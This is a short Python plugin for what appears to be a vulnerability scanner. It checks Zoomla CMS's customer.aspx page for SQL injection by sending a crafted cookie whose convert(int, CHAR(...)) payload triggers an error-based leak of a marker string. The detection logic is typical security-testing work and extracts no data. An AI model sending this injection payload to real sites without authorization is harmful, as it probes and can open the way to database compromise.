#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 01001000entai
#_PlugName_ = zoomla costmer.aspx sql injection
#_Function_ = 插件格式
#_FileName_ = Plugin_Format.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-059965
#___Flag___ = 438b1eb36b7e244b
def assign(service, arg):
    if service == 'zoomla':
        return True, arg

def audit(arg):
    payload = "customer.aspx?type=msg"
    target = arg + payload
    cookie = "Provisional=Uid=convert(int,CHAR(104)+CHAR(101)+CHAR(110)+CHAR(116)+CHAR(97)+CHAR(105))"
    code, head, body, errcode, final_url = curl.curl('-b "%s" "%s"' % (cookie, target))
    if code == 500 and 'hentai' in body:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('zoomla', 'http://192.168.0.104/')[1])
